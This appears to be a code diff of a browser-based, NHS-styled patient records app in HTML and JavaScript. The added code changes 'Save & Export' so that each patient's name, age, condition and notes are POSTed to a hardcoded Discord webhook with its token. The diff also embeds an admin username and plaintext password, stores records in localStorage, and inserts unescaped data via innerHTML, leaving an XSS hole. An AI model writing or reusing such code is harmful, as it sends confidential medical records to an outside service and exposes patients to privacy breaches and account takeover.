@@ -2,126 +2,100 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>NHS Patient Records Management System</title>
+  <title>Patient Management System</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <style>
-    /* NHS style color palette */
+    /* NHS Colors */
     :root {
       --nhs-blue: #005eb8;
-      --nhs-light-blue: #0072ce;
-      --nhs-dark-blue: #003087;
-      --nhs-grey-light: #f4f7f9;
-      --nhs-grey-medium: #7a869a;
-      --nhs-grey-dark: #2a2a2a;
-      --nhs-green: #007a3d;
-      --nhs-red: #d5281b;
-      --nhs-font: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      --nhs-light-blue: #00a1e5;
+      --nhs-dark-blue: #003b5c;
+      --nhs-green: #78be20;
+      --nhs-light-grey: #f0f0f0;
+      --nhs-dark-grey: #555555;
+      --nhs-white: #ffffff;
     }
 
     body {
       margin: 0;
-      font-family: var(--nhs-font);
-      background: var(--nhs-grey-light);
-      color: var(--nhs-grey-dark);
+      font-family: Arial, Helvetica, sans-serif;
+      background-color: #f4f6f8;
       padding: 20px;
     }
 
     .container {
-      max-width: 960px;
+      max-width: 900px;
       margin: auto;
-      background: white;
-      padding: 30px 40px;
-      border-radius: 4px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      background-color: var(--nhs-white);
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
     }
 
     h1, h2, h3 {
-      font-weight: 600;
-      color: var(--nhs-blue);
+      color: var(--nhs-dark-blue);
+    }
+
+    h1 {
+      font-size: 2.5rem;
       margin-bottom: 20px;
+    }
+
+    h2 {
+      font-size: 1.8rem;
+      margin-bottom: 15px;
     }
 
     form {
       display: flex;
       flex-wrap: wrap;
-      gap: 15px;
+      gap: 20px;
       margin-bottom: 30px;
     }
 
-    input[type="text"],
-    input[type="password"],
-    input[type="number"],
-    textarea {
+    input, textarea {
       flex: 1 1 300px;
-      padding: 12px 14px;
+      padding: 12px;
       font-size: 16px;
-      border: 2px solid var(--nhs-grey-medium);
-      border-radius: 4px;
-      transition: border-color 0.3s ease;
-    }
-
-    input[type="text"]:focus,
-    input[type="password"]:focus,
-    input[type="number"]:focus,
-    textarea:focus {
-      border-color: var(--nhs-blue);
-      outline: none;
-    }
-
-    textarea {
-      resize: vertical;
-      min-height: 80px;
-      font-family: var(--nhs-font);
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      background-color: var(--nhs-light-grey);
     }
 
     button {
-      background: var(--nhs-blue);
-      color: white;
-      padding: 12px 26px;
+      background-color: var(--nhs-blue);
+      color: var(--nhs-white);
+      padding: 12px 20px;
       border: none;
-      border-radius: 4px;
+      border-radius: 5px;
       cursor: pointer;
       font-size: 16px;
-      font-weight: 600;
-      transition: background-color 0.3s ease;
-      flex-shrink: 0;
-      align-self: center;
     }
 
     button:hover {
-      background: var(--nhs-dark-blue);
+      background-color: var(--nhs-light-blue);
     }
 
     table {
       width: 100%;
       border-collapse: collapse;
       margin-bottom: 30px;
-      font-size: 15px;
-      color: var(--nhs-grey-dark);
     }
 
     th, td {
-      padding: 14px 12px;
+      padding: 12px;
       text-align: left;
-      border-bottom: 1px solid var(--nhs-grey-medium);
+      border-bottom: 1px solid var(--nhs-light-grey);
       vertical-align: middle;
     }
 
-    th {
-      background: var(--nhs-grey-light);
-      font-weight: 600;
-      color: var(--nhs-blue);
-    }
-
     tr:hover {
-      background: #e6f0ff;
+      background-color: var(--nhs-light-grey);
     }
 
     a.patient-name {
       color: var(--nhs-blue);
       text-decoration: none;
-      cursor: pointer;
-      font-weight: 600;
     }
 
     a.patient-name:hover {
@@ -129,12 +103,12 @@
     }
 
     .back-button {
-      margin-bottom: 20px;
       display: inline-block;
+      margin-bottom: 20px;
       color: var(--nhs-blue);
       cursor: pointer;
-      user-select: none;
-      font-weight: 600;
+      font-size: 18px;
+      font-weight: bold;
     }
 
     ul.notes {
@@ -143,68 +117,48 @@
     }
 
     ul.notes li {
-      background: var(--nhs-grey-light);
-      padding: 12px 16px;
-      margin-bottom: 12px;
-      border-radius: 4px;
-      white-space: pre-line;
-      color: var(--nhs-grey-dark);
-      font-size: 15px;
+      background-color: var(--nhs-light-grey);
+      padding: 12px;
+      margin-bottom: 15px;
+      border-radius: 5px;
     }
 
     .delete-btn {
-      background: var(--nhs-red);
+      background-color: var(--nhs-green);
       border: none;
-      color: white;
-      padding: 7px 14px;
-      border-radius: 4px;
+      color: var(--nhs-white);
+      padding: 8px 14px;
+      border-radius: 5px;
       cursor: pointer;
       font-size: 14px;
-      transition: background-color 0.3s ease;
-      margin-right: 8px;
     }
 
     .delete-btn:hover {
-      background: #a71d15;
+      background-color: var(--nhs-dark-blue);
     }
 
     .export-btn {
-      background: var(--nhs-green);
+      background-color: var(--nhs-blue);
       border: none;
-      color: white;
-      padding: 7px 14px;
-      border-radius: 4px;
+      color: var(--nhs-white);
+      padding: 8px 14px;
+      border-radius: 5px;
       cursor: pointer;
       font-size: 14px;
-      transition: background-color 0.3s ease;
     }
 
     .export-btn:hover {
-      background: #00542a;
+      background-color: var(--nhs-light-blue);
     }
 
-    /* User management table */
-    #userTable input[type="text"] {
-      border: 1px solid var(--nhs-grey-medium);
-      border-radius: 4px;
-      padding: 6px 8px;
-      font-size: 14px;
+    .disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
     }
 
-    #userTable button {
-      padding: 6px 12px;
-      font-size: 14px;
-      margin-right: 6px;
-    }
-
-    /* Responsive */
-    @media (max-width: 700px) {
+    @media (max-width: 600px) {
       form {
         flex-direction: column;
-      }
-
-      input, textarea, button {
-        flex: 1 1 100%;
       }
     }
   </style>
@@ -213,26 +167,26 @@
 
   <!-- Login View -->
   <div class="container" id="loginView">
-    <h1>NHS Login</h1>
+    <h1>Login</h1>
     <form id="loginForm">
-      <input type="text" id="loginUsername" placeholder="Username" required autocomplete="off" />
-      <input type="password" id="loginPassword" placeholder="Password" required autocomplete="off" />
+      <input type="text" id="loginUsername" placeholder="Username" required />
+      <input type="password" id="loginPassword" placeholder="Password" required />
       <button type="submit">Login</button>
     </form>
   </div>
 
   <!-- Main Application View -->
   <div class="container" id="mainView" style="display: none;">
-    <h1>NHS Patient Records Management System</h1>
-    <form id="addPatientForm" aria-label="Add new patient form">
-      <input type="text" id="name" placeholder="Patient Name" required autocomplete="off" />
+    <h1>Patient Management System</h1>
+    <form id="addPatientForm">
+      <input type="text" id="name" placeholder="Patient Name" required />
       <input type="number" id="age" placeholder="Age" required min="0" />
       <textarea id="condition" placeholder="Medical Condition" required></textarea>
       <button type="submit">Add Patient</button>
     </form>
 
     <h2>Patient List</h2>
-    <table id="patientTable" aria-label="Patient list table">
+    <table id="patientTable">
       <thead>
         <tr>
           <th>Name</th>
@@ -247,31 +201,31 @@
 
   <!-- Patient Detail View -->
   <div class="container" id="patientView" style="display: none;">
-    <span class="back-button" id="backBtn" role="button" tabindex="0" aria-label="Back to patient list">← Back to list</span>
+    <span class="back-button" id="backBtn">← Back to list</span>
     <h2 id="patientName"></h2>
     <p><strong>Age:</strong> <span id="patientAge"></span></p>
     <p><strong>Condition:</strong> <span id="patientCondition"></span></p>
 
     <h3>Add Entry / Note</h3>
-    <form id="addEntryForm" aria-label="Add patient note form">
+    <form id="addEntryForm">
       <textarea id="entryText" placeholder="Write a note..." required></textarea>
       <button type="submit">Add Entry</button>
     </form>
 
     <h3>Patient Notes</h3>
-    <ul class="notes" id="notesList" aria-label="List of patient notes"></ul>
+    <ul class="notes" id="notesList"></ul>
   </div>
 
   <!-- Admin User Management -->
   <div class="container" id="adminPanel" style="display: none;">
     <h2>User Management (Admin Only)</h2>
-    <form id="addUserForm" aria-label="Add new user form">
-      <input type="text" id="newUsername" placeholder="New Username" required autocomplete="off" />
-      <input type="password" id="newPassword" placeholder="New Password" required autocomplete="off" />
+    <form id="addUserForm">
+      <input type="text" id="newUsername" placeholder="New Username" required />
+      <input type="password" id="newPassword" placeholder="New Password" required />
       <button type="submit">Add User</button>
     </form>
 
-    <table id="userTable" aria-label="User management table">
+    <table id="userTable" style="width:100%; border-collapse: collapse;">
       <thead>
         <tr>
           <th>Username</th>
@@ -284,13 +238,9 @@
   </div>
 
   <script>
-    let users = JSON.parse(localStorage.getItem('users')) || [];
-    // Ensure admin user exists
-    if (!users.find(u => u.username === 'CF')) {
-      users.push({ username: 'CF', password: 'HiLLonden1!!', isAdmin: true });
-      localStorage.setItem('users', JSON.stringify(users));
-    }
-
+    let users = JSON.parse(localStorage.getItem('users')) || [
+      { username: "charlotte fletcher", password: "HiLLonden1!!", isAdmin: true }
+    ];
     let currentUser = null;
     let patients = JSON.parse(localStorage.getItem('patients')) || [];
     let currentPatientIndex = null;
@@ -320,8 +270,6 @@
         if (user.isAdmin) {
           adminPanel.style.display = 'block';
           renderUsers();
-        } else {
-          adminPanel.style.display = 'none';
         }
         renderPatients();
       } else {
@@ -352,14 +300,14 @@
       users.forEach((user, index) => {
         const tr = document.createElement('tr');
         const disableEdit = user.isAdmin ? 'disabled' : '';
-        tr.innerHTML = 
+        tr.innerHTML = `
           <td><input type="text" value="${user.username}" data-index="${index}" class="edit-user" ${disableEdit} style="width:100%"></td>
           <td>${user.isAdmin ? 'Admin' : 'User'}</td>
           <td>
             <button class="save-user-btn" data-index="${index}" ${disableEdit}>Save</button>
             <button class="delete-user-btn" data-index="${index}" ${disableEdit}>Delete</button>
           </td>
-        ;
+        `;
         userTableBody.appendChild(tr);
       });
     }
@@ -369,7 +317,7 @@
       const index = Number(target.getAttribute('data-index'));
 
       if (target.classList.contains('save-user-btn')) {
-        const newName = document.querySelector(.edit-user[data-index="${index}"]).value.trim();
+        const newName = document.querySelector(`.edit-user[data-index="${index}"]`).value.trim();
         if (!newName) {
           alert("Username cannot be empty.");
           return;
@@ -388,7 +336,7 @@
           alert("Cannot delete admin.");
           return;
         }
-        if (confirm(Delete user "${users[index].username}"?)) {
+        if (confirm(`Delete user "${users[index].username}"?`)) {
           users.splice(index, 1);
           localStorage.setItem('users', JSON.stringify(users));
           renderUsers();
@@ -400,7 +348,7 @@
       patientTableBody.innerHTML = '';
       patients.forEach((patient, index) => {
         const row = document.createElement('tr');
-        row.innerHTML = 
+        row.innerHTML = `
           <td><a href="#" class="patient-name" data-index="${index}">${patient.name}</a></td>
           <td>${patient.age}</td>
           <td>${patient.condition}</td>
@@ -408,7 +356,7 @@
             <button class="delete-btn" data-index="${index}">Delete</button>
             <button class="export-btn" data-index="${index}">Save & Export</button>
           </td>
-        ;
+        `;
         patientTableBody.appendChild(row);
       });
       localStorage.setItem('patients', JSON.stringify(patients));
@@ -461,58 +409,58 @@
       currentPatientIndex = null;
     });
 
-    backBtn.addEventListener('keydown', (e) => {
-      if (e.key === 'Enter' || e.key === ' ') {
-        backBtn.click();
-      }
-    });
-
-    addEntryForm.addEventListener('submit', e => {
-      e.preventDefault();
-      const text = entryText.value.trim();
-      if (!text) return;
-      patients[currentPatientIndex].notes.push(text);
-      saveAndRender();
-      entryText.value = '';
-      renderNotes();
-    });
-
     function renderNotes() {
       notesList.innerHTML = '';
-      const notes = patients[currentPatientIndex].notes || [];
-      notes.forEach((note, i) => {
+      if (currentPatientIndex === null) return;
+      const notes = patients[currentPatientIndex].notes;
+      notes.forEach(note => {
         const li = document.createElement('li');
         li.textContent = note;
         notesList.appendChild(li);
       });
     }
 
+    addEntryForm.addEventListener('submit', e => {
+      e.preventDefault();
+      const note = entryText.value.trim();
+      if (note && currentPatientIndex !== null) {
+        patients[currentPatientIndex].notes.push(note);
+        saveAndRender();
+        renderNotes();
+        addEntryForm.reset();
+      }
+    });
+
     function deletePatient(index) {
-      if (confirm(Delete patient "${patients[index].name}"?)) {
+      if (confirm(`Delete patient "${patients[index].name}"?`)) {
+        if (currentPatientIndex === index) {
+          patientView.style.display = 'none';
+          mainView.style.display = 'block';
+        }
         patients.splice(index, 1);
         saveAndRender();
       }
     }
 
+    function saveAndExportPatient(index) {
+      const patient = patients[index];
+      const patientData = {
+        content: `New Patient Record:\n**Name**: ${patient.name}\n**Age**: ${patient.age}\n**Condition**: ${patient.condition}\n\n**Notes**:\n${patient.notes.length ? patient.notes.join('\n') : 'No notes available.'}`
+      };
+      fetch('https://discord.com/api/webhooks/1396950794959589426/gLcOXOw22RnywXltDJCLCwtFoKYdlNRqdd2MdemcFHo-PHYdlssLhg7bulA9aTAUZROd', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(patientData)
+      })
+        .then(response => response.json())
+        .then(() => alert('Patient data exported to Discord!'))
+        .catch(error => console.error('Error exporting data:', error));
+    }
+
     function saveAndRender() {
       localStorage.setItem('patients', JSON.stringify(patients));
       renderPatients();
-      if (currentPatientIndex !== null) renderNotes();
-    }
-
-    function saveAndExportPatient(index) {
-      const patient = patients[index];
-      const dataStr = Patient: ${patient.name}\nAge: ${patient.age}\nCondition: ${patient.condition}\n\nNotes:\n${patient.notes.join('\n- ')};
-      const blob = new Blob([dataStr], { type: 'text/plain' });
-      const url = URL.createObjectURL(blob);
-      const a = document.createElement('a');
-      a.href = url;
-      a.download = ${patient.name.replace(/\s+/g, '_')}_record.txt;
-      a.click();
-      URL.revokeObjectURL(url);
-      alert("Patient record saved and exported.");
     }
   </script>
 </body>
 </html>
-
